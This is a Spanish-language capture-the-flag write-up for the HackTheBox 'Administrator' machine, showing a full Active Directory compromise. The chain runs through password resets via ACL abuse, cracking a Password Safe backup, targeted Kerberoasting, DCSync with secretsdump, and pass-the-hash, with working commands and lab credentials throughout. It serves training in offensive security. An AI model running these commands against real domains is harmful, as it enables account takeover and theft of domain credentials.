
---
title: Administrator - HackTheBox
---

## 1. Reconocimiento

> Credenciales de inicio proporcionadas por la plataforma: `Olivia : ichliebedich`
> 

### Escaneo de puertos

```jsx
nmap -p- -vvv --min-rate 10000 10.129.34.95`

PORT      STATE SERVICE          REASON
21/tcp    open  ftp              syn-ack ttl 127
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127`
```

```jsx
nmap -sSCV -Pn 10.129.34.95`

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-08 02:13:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb)
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: 6h58m50s`
```

> Perfil claro de Controlador de Dominio (DC): Kerberos 88, LDAP 389/636, SMB 445, WinRM 5985, FTP 21.
El dominio es `administrator.htb`.
> 

### Enumeración inicial

```jsx
echo "10.129.34.95 administrator.htb dc.administrator.htb" | sudo tee -a /etc/hosts
```

```jsx
netexec smb 10.129.34.95 -u Olivia -p 'ichliebedich' --users`

SMB  10.129.34.95  445  DC  [*] Windows Server 2022 Build 20348 x64
SMB  10.129.34.95  445  DC  [+] administrator.htb\Olivia:ichliebedich
SMB  10.129.34.95  445  DC  -Username-       -Last PW Set-
SMB  10.129.34.95  445  DC  Administrator    2024-10-22 18:59:36
SMB  10.129.34.95  445  DC  Guest            <never>
SMB  10.129.34.95  445  DC  krbtgt           2024-10-04 19:53:28
SMB  10.129.34.95  445  DC  olivia           2024-10-06 01:22:48
SMB  10.129.34.95  445  DC  michael          2024-10-06 01:33:37
SMB  10.129.34.95  445  DC  benjamin         2024-10-06 01:34:56
SMB  10.129.34.95  445  DC  emily            2024-10-30 23:40:02
SMB  10.129.34.95  445  DC  ethan            2024-10-12 20:52:14
SMB  10.129.34.95  445  DC  alexander        2024-10-31 00:18:04
SMB  10.129.34.95  445  DC  emma             2024-10-31 00:18:35`

```

```jsx
netexec smb 10.129.34.95 -u Olivia -p 'ichliebedich' --shares

SMB  10.129.34.95  445  DC  Share       Permissions
SMB  10.129.34.95  445  DC  ADMIN$
SMB  10.129.34.95  445  DC  C$
SMB  10.129.34.95  445  DC  IPC$        READ
SMB  10.129.34.95  445  DC  NETLOGON    READ
SMB  10.129.34.95  445  DC  SYSVOL      READ

```

### Recolección de datos con BloodHound

BloodHound es una herramienta que recolecta información del Active Directory (usuarios, grupos, ACLs, GPOs, sesiones) y la representa como un grafo de ataque. Permite identificar visualmente cadenas de privilegios que serían imposibles de ver manualmente.

```jsx

bloodhound-python -u Olivia -p 'ichliebedich' -d administrator.htb -ns 10.129.34.95 -c All --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: administrator.htb
INFO: Found 1 domains
INFO: Found 1 computers
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Done in 00M 28S
INFO: Compressing output into 20260507224224_bloodhound.zip
```

> Importar el ZIP en BloodHound y marcar a `Olivia` como **owned**. Al analizar el grafo se descubre la siguiente cadena de ACL abuse:
> 
> 
> `Olivia` → **GenericAll** → `michael` → **GenericWrite** → `emily` → **GenericWrite** → `ethan` → **DCSync** → `Administrator`
> 

---

## 2. Vector de entrada

La cadena de ataque es un **ACL Abuse en cascada** sobre Active Directory. Cada permiso mal configurado permite tomar control del siguiente usuario hasta llegar al Administrador del dominio.

**GenericAll** sobre un usuario permite cambiarle la contraseña sin conocer la actual.
**GenericWrite** sobre un usuario permite modificar sus atributos, incluyendo `servicePrincipalName`, lo que habilita un ataque de Kerberoasting dirigido (targeted Kerberoasting).

### Pasos

**Paso 1 — Acceso inicial vía WinRM con Olivia**

```jsx
evil-winrm -i 10.129.34.95 -u Olivia -p 'ichliebedich'

Evil-WinRM shell v3.9
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents>

```

---

## 3. Cadena de ACL Abuse: Olivia → Michael → Benjamin → Emily → Ethan

### Paso 2 — Olivia tiene GenericAll sobre Michael: forzar cambio de contraseña

`GenericAll` es el permiso más amplio en AD. Da control total sobre el objeto objetivo: se puede cambiar su contraseña, modificar sus atributos, añadirlo a grupos, etc.

```jsx
net rpc password michael 'Password123!' -U administrator.htb/Olivia%'ichliebedich' -S 10.129.34.95

(sin output = éxito)

```

```jsx
nxc smb 10.129.34.95 -u michael -p 'Password123!'

SMB  10.129.34.95  445  DC  [+] administrator.htb\michael:Password123!
```

**Paso 3 — Michael tiene GenericAll sobre Benjamin: forzar cambio de contraseña**

```jsx
net rpc password benjamin 'Password123!' -U administrator.htb/michael%'Password123!' -S 10.129.34.95

(sin output = éxito)
```

```jsx
nxc smb 10.129.34.95 -u benjamin -p 'Password123!'

SMB  10.129.34.95  445  DC  [+] administrator.htb\benjamin:Password123!

```

**Paso 4 — Benjamin tiene acceso FTP: descargar Backup.psafe3**

Benjamin tiene acceso al servicio FTP que expone un archivo de base de datos Password Safe (`.psafe3`).

```jsx
ftp 10.129.34.95

Name: benjamin
Password: Password123!
230 User logged in.

```

```jsx
ftp> ls

10-05-24  09:13AM   952 Backup.psafe3
ftp> get Backup.psafe3

100% |****| 952  7.07 KiB/s  00:00 ETA
226 Transfer complete.
```

**Paso 5 — Crackear la contraseña maestra del archivo .psafe3**

Un archivo `.psafe3` es una base de datos cifrada del gestor de contraseñas Password Safe. `pwsafe2john` extrae el hash de la contraseña maestra para crackear con John.

```jsx
pwsafe2john Backup.psafe3 > psafe3.hash
john psafe3.hash --wordlist=/usr/share/wordlists/rockyou.txt

tekieromucho     (Backup)
1g 0:00:00:00 DONE (2026-05-07 18:19)
Session completed.
```

**Paso 6 — Abrir la base de datos y extraer credenciales**

```jsx
pwsafe Backup.psafe3
# Contraseña maestra: tekieromucho
```

Credenciales obtenidas de la base de datos:

```jsx
alexander : UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily     : UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma      : WwANQWnmJnGV07WQN8bMS7FMAbjNure
```

---

## 3. Acceso inicial (user flag)

```jsx
evil-winrm -i 10.129.34.95 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'

Evil-WinRM shell v3.9
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Desktop> type user.txt
[user flag]
```

---

## 4. Escalada de privilegios

**Emily tiene GenericWrite sobre Ethan**, que a su vez tiene permisos de replicación sobre el dominio (`GetChanges`, `GetChangesAll`, `GetChangesInFilteredSet`), lo que permite un ataque DCSync.

La técnica es **Targeted Kerberoasting**: usando `GenericWrite`, se asigna un SPN falso a Ethan, lo que convierte su cuenta en Kerberoasteable (el DC emite un ticket cifrado con su hash NTLM). Se solicita ese ticket, se crackea offline y se obtiene su contraseña en texto claro.

**Paso 1 — Clonar krbrelayx para usar addspn.py**

```jsx
git clone https://github.com/dirkjanm/krbrelayx
cd krbrelayx
```

**Paso 2 — Asignar SPN falso a Ethan con los permisos de Emily**

```jsx
python3 addspn.py \
  -u 'administrator.htb\emily' \
  -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' \
  -s 'fake/dc.administrator.htb' \
  -t 'ethan' \
  10.129.34.95`

`[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

**Paso 3 — Sincronizar reloj (necesario para Kerberos)**

```jsx
sudo ntpdate 10.129.34.95
```

**Paso 4 — Solicitar TGT de Emily y realizar Kerberoasting contra Ethan**

```jsx
impacket-getTGT administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -dc-ip 10.129.34.95
export KRB5CCNAME=emily.ccache

[*] Saving ticket in emily.ccache
```

```jsx
impacket-GetUserSPNs administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' \
  -dc-ip 10.129.34.95 \
  -request \
  -outputfile ethan.hash

ServicePrincipalName       Name   PasswordLastSet             LastLogon
-------------------------  -----  --------------------------  ---------
fake/dc.administrator.htb  ethan  2024-10-12 16:52:14.117811  <never>
```

**Paso 5 — Crackear el hash de Ethan**

```jsx
john ethan.hash --wordlist=/usr/share/wordlists/rockyou.txt

limpbizkit       (?)
1g 0:00:00:00 DONE (2026-05-08 05:47)
Session completed.`

ethan : limpbizkit
```

**Paso 6 — DCSync con Ethan para volcar el hash del Administrador**

Ethan tiene los permisos `DS-Replication-Get-Changes`, `DS-Replication-Get-Changes-All` y `DS-Replication-Get-Changes-In-Filtered-Set` sobre el objeto del dominio. Esto permite simular un controlador de dominio secundario y solicitar la replicación de credenciales (incluidos los hashes NTLM) sin necesitar privilegios de administrador local en el DC.

```jsx
impacket-secretsdump 'administrator.htb/ethan:limpbizkit@10.129.34.95' \
  -dc-ip 10.129.34.95 \
  -just-dc-user Administrator

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
[*] Cleaning up...
```

**Paso 7 — Pass-the-Hash hacia Administrator**

Con el hash NT se puede autenticar directamente sin necesitar la contraseña en texto claro (Pass-the-Hash).

```jsx
evil-winrm -i 10.129.34.95 -u Administrator -H '3dc553ce4b9fd20bd016e098d2d2fd2e'

Evil-WinRM shell v3.9
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
[flag root]
```

---



---

## 6. Lecciones aprendidas

- **BloodHound es indispensable en entornos AD.** Las cadenas de ACL abuse son invisibles sin visualización de grafos. El camino `Olivia → michael → benjamin → emily → ethan → Administrator` tiene cinco saltos y nunca lo encontrarías manualmente.
- **GenericAll sobre un usuario = control total.** `net rpc password` permite cambiar contraseñas remotamente sin conocer la actual, siempre que se tenga el permiso en el DACL del objeto.
- **GenericWrite habilita Targeted Kerberoasting.** Asignar un SPN falso vía `addspn.py` convierte cualquier cuenta en Kerberoasteable. No hace falta que el usuario tenga SPNs originalmente.
- **Los archivos .psafe3 son vectores de credenciales.** Un backup de Password Safe en un FTP accesible es una mina de oro. Siempre buscar archivos de gestores de contraseñas: `.psafe3`, `.kdbx`, `.1pux`.
- **DCSync no requiere ser local admin en el DC.** Solo hacen falta los permisos de replicación en el objeto del dominio. BloodHound los muestra como `GetChangesAll`.
- **Pass-the-Hash con Evil-WinRM** funciona pasando directamente el hash NT con `H`, sin necesitar crackearlo si el objetivo solo es el acceso.
- **En máquinas similares buscar:** permisos `GenericAll`/`GenericWrite`/`WriteDACL` en BloodHound, archivos de backup en FTP/SMB/shares, cuentas con derechos de replicación sobre el dominio.